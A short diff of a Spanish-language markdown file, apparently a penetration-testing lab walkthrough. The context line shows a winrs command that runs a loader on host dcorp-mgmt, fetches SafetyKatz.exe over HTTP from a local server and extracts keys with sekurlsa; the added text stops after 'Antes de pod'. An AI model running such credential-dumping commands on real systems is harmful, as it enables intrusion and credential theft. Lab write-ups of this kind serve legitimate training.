@@ -340,3 +340,5 @@ Una vez hemos cargado el archivo extraeremos las credenciales usando
 ```shell
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
+
+Antes de pod
